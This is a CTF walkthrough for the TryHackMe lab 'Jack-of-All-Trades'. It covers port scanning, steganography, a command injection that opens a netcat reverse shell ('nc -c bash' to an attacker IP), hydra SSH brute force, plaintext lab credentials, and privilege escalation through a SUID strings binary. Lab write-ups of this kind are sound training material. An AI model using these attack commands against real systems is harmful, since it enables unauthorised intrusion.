# [Jack-of-All-Trades](https://tryhackme.com/room/jackofalltrades)

## Boot-to-root originally designed for Securi-Tay 2020

# Flags

## Jack is a man of a great many talents. The zoo has employed him to capture the penguins due to his years of penguin-wrangling experience, but all is not as it seems... We must stop him! Can you see through his facade of a forgetful old toymaker and bring this lunatic down?

### User Flag

1. Scan all ports with nmap to identify running services

```bash
nmap -sV IP
```

[SCREEN01]

2. Configure Firefox to access HTTP service on port 22
   - Navigate to `about:config` and set `network.security.ports.banned.override` to **22** as **string**

[SCREEN02]

3. Analyze the main page source code at `http://<IP>:22/`

   - Reference to `/recovery.php` endpoint
   - Base64 encoded string containing password
   - Decode the string in [CyberChef](https://gchq.github.io/CyberChef/)
   - **Password:** `u?WtKSraq`

4. Examine `http://<IP>:22/recovery.php` source code

   - Decode the string in [CyberChef](https://gchq.github.io/CyberChef/): From Base32 -> From Hex -> ROT13
   - Link to wikipedia page `bit.ly/2TvYQ2S`

5. Download images from `http://<IP>:22/` and analyze with steghide
   - **Extracted credentials:** `jackinthebox:TplFxiSHjY`

```bash
steghide extract -sf header.jpg
# Password: u?WtKSraq
```

6. Start netcat listener, log in to the `http://IP/recovery.php` and add `?cmd=nc -c bash 10.10.123.224 4444` at the end of the url

```bash
nc -lvnp 4444
```

[SCREEN03]

7. Establish stable shell, locate password list and save it to a file

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
cd /home
cat jacks_password_list
```

[SCREEN04]

8. Attack SSH service running on port 80
   - The credentials are: **jack:ITMJpGGIqg1jn?>@**

```bash
hydra -l jack -P passwords.txt ssh://IP:80
```

[SCREEN05]

9. Log in as jack, download the image, and get the user flag from it

```bash
ssh -p 80 jack@IP
# Password: ITMJpGGIqg1jn?>@

```

```bash
scp -P 80 jack@IP:/home/jack/user.jpg /root/user.jpg
# Password: ITMJpGGIqg1jn?>@
```

[SCREEN06]

---

### Root Flag

1. Find SUID binaries to identify privilege escalation vectors

```bash
find / -perm -u=s -type f 2>/dev/null
```

[SCREEN07]

2. Exploit the SUID `strings` binary to read the root flag

```bash
strings /root/root.txt
```

[SCREEN08]
